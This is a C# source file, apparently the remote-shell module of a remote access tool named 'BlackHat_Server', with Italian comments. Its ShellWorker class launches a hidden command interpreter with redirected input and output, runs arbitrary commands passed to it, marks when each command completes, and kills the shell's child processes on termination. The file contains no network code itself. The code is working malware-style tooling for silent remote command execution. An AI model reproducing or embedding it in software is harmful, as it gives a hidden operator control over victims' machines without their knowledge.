using System;
using System.Diagnostics;

namespace BlackHat_Server
{
    internal class ShellWorker
    {
        private Process _process;
        public string sCmdComplete = "BC_Shell_End"; // QUESTA LINEA MI INDICA CHE IL COMANDO è STATO CONCLUSO
        public event DataReceivedEventHandler StdOut;
        public event DataReceivedEventHandler StdError;

        /// <summary>
        ///     Inizializzazione
        /// </summary>
        public bool Initialize()
        {
            try
            {
                if (StdOut == null && StdError == null)
                    return false;

                string comspec;
                try
                {
                    comspec = Environment.GetEnvironmentVariable("comspec");
                }
                catch
                {
                    return false;
                }

                if (string.IsNullOrEmpty(comspec))
                    return false;

                _process = new Process
                {
                    StartInfo =
                    {
                        FileName = comspec,
                        RedirectStandardInput = true,
                        RedirectStandardOutput = true,
                        RedirectStandardError = true,
                        CreateNoWindow = true,
                        UseShellExecute = false
                    },
                    EnableRaisingEvents = true
                };

                _process.ErrorDataReceived += StdError;
                _process.OutputDataReceived += StdOut;
                _process.Start();

                if (StdError != null)
                    _process.BeginErrorReadLine();

                if (StdOut != null)
                    _process.BeginOutputReadLine();

                return true;
            }
            catch
            {
                return false;
            }
        }
        //-------------

        /// <summary>
        ///     Esegue il comando
        /// </summary>
        /// <param name="command">The command.</param>
        public void Execute(string command)
        {
            try
            {
                if (_process == null || StdOut == null && StdError == null || _process.HasExited)
                {
                    if (_process != null)
                        Terminate();

                    Initialize();
                }

                if (_process != null)
                {
                    _process.StandardInput.WriteLine(command);
                    _process.StandardInput.WriteLine(""); // chiedo localizzazione
                    _process.StandardInput.WriteLine("@echo " + sCmdComplete); // fine comandi
                }
            }
            catch
            {
            }
        }

        /// <summary>
        ///     termina processi
        /// </summary>
        public void Terminate()
        {
            try
            {
                if (_process == null || _process.HasExited)
                    return;

                var processes = Process.GetProcesses();
                foreach (var process in processes)
                    try
                    {
                        var pfc = new PerformanceCounter("Process", "Creating Process Id", process.ProcessName);
                        if ((int) pfc.RawValue == _process.Id)
                            process.Kill();
                    }
                    catch
                    {
                    }

                _process.Kill();
                _process.Close();
                _process = null;
            }
            catch
            {
            }
        }
    }
}